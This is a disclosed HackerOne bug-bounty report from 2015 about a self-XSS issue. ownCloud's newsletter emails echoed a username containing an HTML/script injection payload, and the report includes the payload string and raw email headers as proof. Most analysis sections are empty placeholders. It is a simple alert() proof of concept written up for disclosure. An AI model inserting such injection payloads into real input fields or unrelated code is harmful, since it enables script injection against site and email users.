# Self-XSS in mails sent by hello@owncloud.com

## Metadata
- **Source:** HackerOne
- **Report:** 92111 | https://hackerone.com/reports/92111
- **Submitted:** 2015-10-02
- **Reporter:** dz_samir
- **Program:** Unknown
- **Bounty:** Not disclosed
- **Severity:** unknown
- **Vuln:** Violation of Secure Design Principles
- **CVEs:** None
- **Category:** web-api

## Summary
Hello 
i create account with username have a payload code "><img src="c" onerror=alert(1)><script>alert(1)</script>,
and i always when i  get mail from hello@owncloud.com i get mail win inject the code payload (html code inject)
From: ownCloud <hello@owncloud.com>
Reply-To: hello@owncloud.com
To: s-dz@hotmail.fr
Message-ID: <1443803020209.163f96fc-108e-42bf-8c10-86406627607e@smtp.hubapi.com>
Subje

## Attack scenario
*(see original)*

## Root cause
*(see original)*

## Attacker mindset
*(see original)*

## Defensive takeaways
*(see original)*

## Variant hunting
*(see original)*

## MITRE ATT&CK
*(see original)*

## Notes
*(see original)*

## Full report
<details><summary>Expand</summary>

Hello 
i create account with username have a payload code "><img src="c" onerror=alert(1)><script>alert(1)</script>,
and i always when i  get mail from hello@owncloud.com i get mail win inject the code payload (html code inject)
From: ownCloud <hello@owncloud.com>
Reply-To: hello@owncloud.com
To: s-dz@hotmail.fr
Message-ID: <1443803020209.163f96fc-108e-42bf-8c10-86406627607e@smtp.hubapi.com>
Subject: ownCloud Security & Encryption 2.0; A Technical Overview
MIME-Version: 1.0
Content-Type: multipart/alternative;
	boundary="----=_Part_2297473_416570165.1443803059574"
List-Unsubscribe: <mailto:MCQyw6Wdcg_W8ys71T8040lgVzv76n4tcsZ_W4fKWHX3ZskbF0@m.hsms06.com>, <http://t.hsms06.com/e1t/c/*W4Zt7h03lnvKlW7vlbtK3d_CYy0/*W48wfbt6qPs7GW8WTnbw5F30_R0/
------=_Part_2297473_416570165.1443803059574
Content-Type: text/plain; charset="utf-8"
Content-Transfer-Encoding: quoted-printable

Hi "><img src=3D"c" onerror=3Dalert(1)><script>alert(1)</script>,

PoC image 


Thanks 

Hadji Samir 

</details>

---
*Analysed by Claude on 2026-05-24*
